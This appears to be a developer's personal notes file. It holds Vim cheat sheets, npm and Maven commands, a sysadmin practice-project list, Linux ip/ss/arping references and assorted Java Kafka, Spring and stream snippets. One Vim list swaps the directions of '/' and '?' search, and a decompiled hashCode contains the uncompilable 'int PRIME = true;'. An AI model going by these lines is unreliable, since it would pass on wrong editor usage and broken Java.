--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### NODE
--------------------------------------------------------------------------------------------------------
npm install fs-extra
npm install google-closure-compiler
npm install preprocessor

npm run test
npm run test:watch
npm run test:release
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### VIM
--------------------------------------------------------------------------------------------------------
1. Insert mode (Where you can just type like normal text editor. Press i for insert mode)
2. Command mode (Where you give commands to the editor to get things done . Press ESC for command mode)

Most of them below are in command mode

    x - to delete the unwanted character
    u - to undo the last the command and U to undo the whole line
    CTRL-R to redo
    A - to append text at the end
    :wq - to save and exit
    :q! - to trash all changes
    dw - move the cursor to the beginning of the word to delete that word
    2w - to move the cursor two words forward.
    3e - to move the cursor to the end of the third word forward.
    0 (zero) to move to the start of the line.
    d2w - which deletes 2 words .. number can be changed for deleting the number of consecutive words like d3w
    dd to delete the line and 2dd to delete to line .number can be changed for deleting the number of consecutive words

The format for a change command is: operator [number] motion
-operator - is what to do, such as d for delete
- [number] - is an optional count to repeat the motion
- motion - moves over the text to operate on, such as w (word),
$ (to the end of line), etc.

    p - puts the previously deleted text after the cursor(Type dd to delete the line and store it in a Vim register. and p to put the line)

    r - to replace the letter e.g press re to replace the letter with e

    ce - to change until the end of a word (place the cursor on the u in lubw it will delete ubw )

    ce - deletes the word and places you in Insert mode

    G - to move you to the bottom of the file.

    gg - to move you to the start of the file.
    Type the number of the line you were on and then G

    % to find a matching ),], or }

    :s/old/new/g to substitute 'new' for 'old' where g is globally

    / backward search n to find the next occurrence and N to search in opposite direction

    ? forward search

    :! to run the shell commands like :!dir, :!ls

    :w - TEST (where TEST is the filename you chose.) . Save the file

    v - starts visual mode for selecting the lines and you can perform operation on that like d delete

    :r - Filename will insert the content into the current file

    R - to replace more than one character

    y - operator to copy text using v visual mode and p to paste it

    yw - (copy)yanks one word

    o - opens a line below the cursor and start Insert mode.

    O - opens a line above the cursor.

    a - inserts text after the cursor.

    A - inserts text after the end of the line.

    e - command moves to the end of a word.

    y - operator yanks (copies) text, p puts (pastes) it.

    R - enters Replace mode until <ESC> is pressed.

    ctrl-w to jump from one window to another

type a command :e and press ctrl+D to list all the command name starts with :e and press tab to complete the command
--------------------------------------------------------------------------------------------------------
Global

:help keyword – open help for keyword
:o file – open file
:saveas file – save file as
:close – close current window

Cursor Movements

h – move cursor left
j – move cursor down
k – move cursor up
l – move cursor right
H – move to top of screen
M – move to middle of screen
L – move to bottom of screen
w – jump forwards to the start of a word
W – jump forwards to the start of a word (words can contain punctuation)
e – jump forwards to the end of a word
E – jump forwards to the end of a word (words can contain punctuation)
b – jump backwards to the start of a word
B – jump backwards to the start of a word (words can contain punctuation)
0 – jump to the start of the line
^ – jump to the first non-blank character of the line
$ – jump to the end of the line
g_ – jump to the last non-blank character of the line
gg – go to the first line of the document
G – go to the last line of the document
5G – go to line 5
fx – jump to next occurrence of character x
tx – jump to before next occurrence of character x
} – jump to next paragraph (or function/block, when editing code)
{ – jump to previous paragraph (or function/block, when editing code)
zz – center cursor on screen
Ctrl + b – move back one full screen
Ctrl + f – move forward one full screen
Ctrl + d – move forward 1/2 a screen
Ctrl + u – move back 1/2 a screen

Tip: Prefix a cursor movement command with a number to repeat it. For example, 4j moves down 4 lines.

Insert Mode

i – insert before the cursor
I – insert at the beginning of the line
a – insert (append) after the cursor
A – insert (append) at the end of the line
o – append (open) a new line below the current line
O – append (open) a new line above the current line
ea – insert (append) at the end of the word
Esc – exit insert mode

Editing

r – replace a single character
J – join line below to the current line
cc – change (replace) entire line
cw – change (replace) to the end of the word
c$ – change (replace) to the end of the line
s – delete character and substitute text
S – delete line and substitute text (same as cc)
xp – transpose two letters (delete and paste)
u – undo
Ctrl + r – redo
. – repeat last command

Marking Text (Visual Mode)

v – start visual mode, mark lines, then perform an operation (such as d-delete)
V – start linewise visual mode
Ctrl + v – start blockwise visual mode
o – move to the other end of marked area
O – move to other corner of block
aw – mark a word
ab – a block with ()
aB – a block with {}
ib – inner block with ()
iB – inner block with {}
Esc – exit visual mode

Visual Commands

> – shift text right
< – shift text left
y – yank (copy) marked text
d – delete marked text
~ – switch case

Registers

:reg – show registers content
"xy – yank into register x
"xp – paste contents of register x

Tip: Registers are being stored in ~/.viminfo, and will be loaded again on next restart of vim.

Tip: Register 0 contains always the value of the last yank command.

Marks

:marks – list of marks
ma – set current position for mark A
`a – jump to position of mark A
y`a – yank text to position of mark A

Macros

qa – record macro a
q – stop recording macro
@a – run macro a
@@ – rerun last run macro

Cut and Paste

yy – yank (copy) a line
2yy – yank (copy) 2 lines
yw – yank (copy) the characters of the word from the cursor position to the start of the next word
y$ – yank (copy) to end of line
p – put (paste) the clipboard after cursor
P – put (paste) before cursor
dd – delete (cut) a line
2dd – delete (cut) 2 lines
dw – delete (cut) the characters of the word from the cursor position to the start of the next word
D – delete (cut) to the end of the line
d$ – delete (cut) to the end of the line
x – delete (cut) character

Exiting

:w – write (save) the file, but don’t exit
:w !sudo tee % – write out the current file using sudo
:wq or :x or ZZ – write (save) and quit
:q – quit (fails if there are unsaved changes)
:q! or ZQ – quit and throw away unsaved changes

Search and Replace

/pattern – search for pattern
?pattern – search backward for pattern
\vpattern – ‘very magic’ pattern: non-alphanumeric characters are interpreted as special regex symbols (no escaping needed)
n – repeat search in same direction
N – repeat search in opposite direction
:%s/old/new/g – replace all old with new throughout file
:%s/old/new/gc – replace all old with new throughout file with confirmations
:noh – remove highlighting of search matches

Search in Multiple Files

:vimgrep /pattern/ {file} – search for pattern in multiple files
e.g.
:vimgrep /foo/ **/*
:cn – jump to the next match
:cp – jump to the previous match
:copen – open a window containing the list of matches

Working With Multiple Files

:e file – edit a file in a new buffer
:bnext or :bn – go to the next buffer
:bprev or :bp – go to the previous buffer
:bd – delete a buffer (close a file)
:ls – list all open buffers
:sp file – open a file in a new buffer and split window
:vsp file – open a file in a new buffer and vertically split window
Ctrl + ws – split window
Ctrl + ww – switch windows
Ctrl + wq – quit a window
Ctrl + wv – split window vertically
Ctrl + wh – move cursor to the left window (vertical split)
Ctrl + wl – move cursor to the right window (vertical split)
Ctrl + wj – move cursor to the window below (horizontal split)
Ctrl + wk – move cursor to the window above (horizontal split)

Tabs

:tabnew or :tabnew file – open a file in a new tab
Ctrl + wT – move the current split window into its own tab
gt or :tabnext or :tabn – move to the next tab
gT or :tabprev or :tabp – move to the previous tab
#gt – move to tab number #
:tabmove # – move current tab to the #th position (indexed from 0)
:tabclose or :tabc – close the current tab and all its windows
:tabonly or :tabo – close all tabs except for the current one
:tabdo command – run the command on all tabs (e.g. :tabdo q – closes all opened tabs)
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### INFO
--------------------------------------------------------------------------------------------------------
Deploy an Open Source Application

Find an application that you would be interested in using and deploy it. Even if you don’t end up using the application you’ll have gained the experience of setting it up.

    Alfresco
    Bugzilla
    DokuWiki
    Drupal
    Etherpad Lite
    Gitlab
    Joomla
    MediaWiki
    Moodle
    osTicket
    OwnCloud
    phpBB
    PunBB
    Redmine
    ServiceDesk Plus
    SugarCRM
    Trac
    Twiki
    WordPress
    Zen Cart

Configure Common Services – Client AND Server

    cron
    CUPS
    DHCP
    DNS
    Email (SMTP, POP, IMAP)
    LDAP
    NFS
    NIS
    NTP
    SSH

Configure Monitoring

    Cacti
    Icinga
    Monit
    Munin
    Nagios
    OpenNMS
    Zabbix
    Zenoss

Create a Build System

    Cobbler
    FAI
    Foreman
    Kickstart
    Razor
    Spacewalk

Create a Centralized Syslog Server

    ELK Stack: Elasticsearch, Logstash & Kibana
    Fluentd
    Logstash
    Kibana
    Splunk
    syslog-ng

System Automation

    Ansible
    Chef
    MakeFiles and/or RakeFiles
    Puppet
    Salt Stack
    Write Shell Scripts

Cluster All The Things

    Load balance web servers or other services using HAProxy
    Create a MySQL Cluster
    Create a GlusterFS Cluster
    Red Hat Cluster (Conga)

Build a NAS

    NFS
    Samba

Practice Migrating Data

    Migrate data from a disk on one server to a disk on another server.
    Migrate Databases.
        Live migrations
        Export / Import

Create and Manage Users

    FreeIPA
    LDAP
    NIS
    User name ideas: http://www.fakenamegenerator.com/

Configure a Backup Server

    Amanda
    Bacula
    Rsnapshot
    Rsync + SSH

Configure a Firewall

    IPtables
    UFW

Learn LVM

    Create and restore snapshots
    Extend volumes without downtime

Configure a Proxy Server

    Forward Proxy
        Apache
        Squid
    Reverse Proxy
        Apache
        NGINX
        Pound

Learn Revision Control

    CVS
    Git
    RCS
--------------------------------------------------------------------------------------------------------
### UNIX/LINUX
--------------------------------------------------------------------------------------------------------
arping
	

Send ARP request to a neighbour host

arping -I eth0 192.168.1.1

Send ARP request to 192.168.1.1 via interface eth0

arping -D -I eth0 192.168.1.1

Check for duplicate MAC addresses at 192.168.1.1 on eth0
--------------------------------------------------------------------------------------------------------
ethtool
	

Query or control network driver and hardware settings

ethtool -g eth0

Display ring buffer for eth0

ethtool -i eth0

Display driver information for eth0

ethtool -p eth0

Identify eth0 by sight, typically by causing LEDs to blink on the network port

ethtool -S eth0

Display network and driver statistics for eth0
--------------------------------------------------------------------------------------------------------
ss
	

Display socket statistics. The below options can be combined

ss -a

Show all sockets (listening and non-listening)

ss -e

Show detailed socket information

ss -o

Show timer information

ss -n

Do not resolve addresses

ss -p

Show process using the socket
--------------------------------------------------------------------------------------------------------
arp -a = ip neigh
arp -v = ip -s neigh
arp -s 192.168.1.1 1:2:3:4:5:6 = ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev eth1
arp -i eth1 -d 192.168.1.1 = ip neigh del 192.168.1.1 dev eth1
ifconfig -a = ip addr
ifconfig eth0 down = ip link set eth0 down
ifconfig eth0 up = ip link set eth0 up
ifconfig eth0 192.168.1.1 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 netmask 255.255.255.0 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 mtu 9000 = ip link set eth0 mtu 9000
ifconfig eth0:0 192.168.1.2 = ip addr add 192.168.1.2/24 dev eth0
netstat = ss
netstat -neopa = ss -neopa
netstat -g = ip maddr
route = ip route
route add -net 192.168.1.0 netmask 255.255.255.0 dev eth0 = ip route add 192.168.1.0/24 dev eth0
route add default gw 192.168.1.1 = ip route add default via 192.168.1.1
--------------------------------------------------------------------------------------------------------
neigh add
	

Add an entry to the ARP Table

ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Add address 192.168.1.1 with MAC 1:2:3:4:5:6 to em1
--------------------------------------------------------------------------------------------------------
neigh del
	

Invalidate an entry

ip neigh del 192.168.1.1 dev em1

Invalidate the entry for 192.168.1.1 on em1
--------------------------------------------------------------------------------------------------------
neigh replace
	

Replace, or adds if not defined, an entry to the ARP table

ip neigh replace 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Replace the entry for address 192.168.1.1 to use MAC 1:2:3:4:5:6 on em1
--------------------------------------------------------------------------------------------------------
route add
	

Add an entry to the routing table

ip route add default via 192.168.1.1 dev em1

Add a default route (for all addresses) via the local gateway 192.168.1.1 that can be reached on device em1

ip route add 192.168.1.0/24 via 192.168.1.1

Add a route to 192.168.1.0/24 via the gateway at 192.168.1.1

ip route add 192.168.1.0/24 dev em1

Add a route to 192.168.1.0/24 that can be reached on

device em1
--------------------------------------------------------------------------------------------------------
route delete
	

Delete a routing table entry

ip route delete 192.168.1.0/24 via 192.168.1.1

Delete the route for 192.168.1.0/24 via the gateway at 192.168.1.1
--------------------------------------------------------------------------------------------------------
route replace
	

Replace, or add if not defined, a route

ip route replace 192.168.1.0/24 dev em1

Replace the defined route for 192.168.1.0/24 to use

device em1
--------------------------------------------------------------------------------------------------------
route get
	

Display the route an address will take

ip route get 192.168.1.5

Display the route taken for IP 192.168.1.5
--------------------------------------------------------------------------------------------------------
addr add
	

Add an address

ip addr add 192.168.1.1/24 dev em1

Add address 192.168.1.1 with netmask 24 to device em1
--------------------------------------------------------------------------------------------------------
addr del
	

Delete an address

ip addr del 192.168.1.1/24 dev em1

Remove address 192.168.1.1/24 from device em1
--------------------------------------------------------------------------------------------------------
link set
	

Alter the status of the interface

ip link set em1 up

Bring em1 online

ip link set em1 down

Bring em1 offline

ip link set em1 mtu 9000

Set the MTU on em1 to 9000

ip link set em1 promisc on

Enable promiscuous mode for em1
--------------------------------------------------------------------------------------------------------
maddr add
	

Add a static link-layer multicast address

ip maddr add 33:33:00:00:00:01 dev em1

Add mutlicast address 33:33:00:00:00:01 to em1
--------------------------------------------------------------------------------------------------------
maddr del
	

Delete a multicast address

ip maddr del 33:33:00:00:00:01 dev em1

Delete address 33:33:00:00:00:01 from em1
--------------------------------------------------------------------------------------------------------
addr
	

Display IP Addresses and property information (abbreviation of address)

ip addr

Show information for all addresses

ip addr show dev em1

Display information only for device em1
--------------------------------------------------------------------------------------------------------
link
	

Manage and display the state of all network interfaces

ip link

Show information for all interfaces

ip link show dev em1

Display information only for device em1

ip -s link

Display interface statistics
--------------------------------------------------------------------------------------------------------
route  
	

Display and alter the routing table

ip route

List all of the route entries in the kernel
--------------------------------------------------------------------------------------------------------
maddr
	

Manage and display multicast IP addresses

ip maddr

Display multicast information for all devices

ip maddr show dev em1

Display multicast information for device em1
--------------------------------------------------------------------------------------------------------
neigh
	

Show neighbour objects; also known as the ARP table for IPv4

ip neigh

Display neighbour objects

ip neigh show dev em1

Show the ARP cache for device em1
--------------------------------------------------------------------------------------------------------
help
	

Display a list of commands and arguments for each subcommand

ip help

Display ip commands and arguments

ip addr help

Display address commands and arguments

ip link help

Display link commands and arguments

ip neigh help

Display neighbour commands and arguments
--------------------------------------------------------------------------------------------------------
try (KafkaConsumer<String, User> consumer = new KafkaConsumer<>(props)) {
    consumer.subscribe(Collections.singletonList(topic));
    while (true) {
        ConsumerRecords<String, User> messages = consumer.poll(100);
        for (ConsumerRecord<String, User> message : messages) {
          System.out.println("Message received " + message.value().toString());
        }
    }
} catch (Exception e) {
    e.printStackTrace();
}
--------------------------------------------------------------------------------------------------------
 F:\BuildAgent\work\9d24e4e3ca3c7728\build\Paragon.Build.proj : error MSB4057: The target "CleanUp_After_Build" does not exist in the project.  
--------------------------------------------------------------------------------------------------------
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = RegisterRestController.class)
class RegisterRestControllerTest {
  @Autowired
  private MockMvc mockMvc;

  @Autowired
  private ObjectMapper objectMapper;

  @MockBean
  private RegisterUseCase registerUseCase;

  @Test
  void whenValidInput_thenReturns200() throws Exception {
    mockMvc.perform(...);
  }
}

C:\git-project\Changeset_on_build_properties.patch
--------------------------------------------------------------------------------------------------------
0.3.0-alpha-0018-c9ebac0
--------------------------------------------------------------------------------------------------------
mvn clean test -P test-unit
--------------------------------------------------------------------------------------------------------
    public boolean equals(Object o) {
        if (o == this) {
            return true;
        } else if (!(o instanceof KafkaRetryProperty)) {
            return false;
        } else {
            KafkaRetryProperty other = (KafkaRetryProperty)o;
            if (!other.canEqual(this)) {
                return false;
            } else if (!super.equals(o)) {
                return false;
            } else {
                return this.isEnabled() == other.isEnabled();
            }
        }
    }

    protected boolean canEqual(Object other) {
        return other instanceof KafkaRetryProperty;
    }

    public int hashCode() {
        int PRIME = true;
        int result = super.hashCode();
        result = result * 59 + (this.isEnabled() ? 79 : 97);
        return result;
    }

    public String toString() {
        return "KafkaRetryProperty(super=" + super.toString() + ", enabled=" + this.isEnabled() + ")";
    }
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks checkout PBA-4653_old --progress

--------------------------------------------------------------------------------------------------------
        final HttpHeaders headers = this.getHeaders(requestUrl);
        headers.setBearerAuth(TestUtils.JWT);
		
		https://wigle.net/phpbb/viewtopic.php?t=2370
--------------------------------------------------------------------------------------------------------
List<List<Emploee>> divided = employees.stream().collect(
      Collectors.teeing(
              Collectors.filtering(Emploee::isActive, Collectors.toList()),
              Collectors.filtering(Predicate.not(Emploee::isActive), Collectors.toList()),
              List::of
      ));

System.out.println(divided.get(0));  //active
System.out.println(divided.get(1));  //inactive
--------------------------------------------------------------------------------------------------------
Map<String, String> map = Stream.of(new String[][] {
  { "Hello", "World" }, 
  { "John", "Doe" }, 
}).collect(Collectors.toMap(data -> data[0], data -> data[1]));

Map<String, String> map = Stream.of(new String[][] { 
    { "Hello", "World" }, 
    { "John", "Doe" },
}).collect(Collectors.collectingAndThen(
    Collectors.toMap(data -> data[0], data -> data[1]), 
    Collections::<String, String> unmodifiableMap));
--------------------------------------------------------------------------------------------------------
Function<Integer, CompletableFuture<Integer>> processAsynchronously = i -> CompletableFuture.completedFuture(i * 2);
assertThat(
        Stream.of(1, 2, 3).map(processAsynchronously)
                .collect(CompletableFutures.toFutureList())
                .get(),
        contains(2, 4, 6));
--------------------------------------------------------------------------------------------------------
@Test
public void whenGenerateStream_thenGetInfiniteStream() {
    Stream.generate(Math::random)
      .limit(5)
      .forEach(System.out::println);
}

@Test
public void whenIterateStream_thenGetInfiniteStream() {
    Stream<Integer> evenNumStream = Stream.iterate(2, i -> i * 2);

    List<Integer> collect = evenNumStream
      .limit(5)
      .collect(Collectors.toList());

    assertEquals(collect, Arrays.asList(2, 4, 8, 16, 32));
}

private List<String> getPalindrome(Stream<String> stream, int length) {
    return stream.filter(s -> s.length() == length)
      .filter(s -> s.compareToIgnoreCase(
        new StringBuilder(s).reverse().toString()) == 0)
      .collect(Collectors.toList());
}

@Test
public void whenFileToStream_thenGetStream() throws IOException {
    List<String> str = getPalindrome(Files.lines(Paths.get(fileName)), 5);
    assertThat(str, contains("refer", "level"));
}
--------------------------------------------------------------------------------------------------------
    /**
     * Returns {@link Map} collection of items {@code T} by input {@link GeneralParamRequest} request
     *
     * @param <T>     type of {@link Map} key value
     * @param request - initial input {@link GeneralParamRequest} request
     * @return {@link Map} collection of items
     */
    public static <T> Map<String, T> getItemsMap(@NonNull final GeneralParamRequest<T> request) {
        return Optional.ofNullable(request.getItems()).orElseGet(Collections::emptyList).stream().collect(HashMap::new, (m, v) -> m.put(v.getKey(), v.getValue()), HashMap::putAll);
    }
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------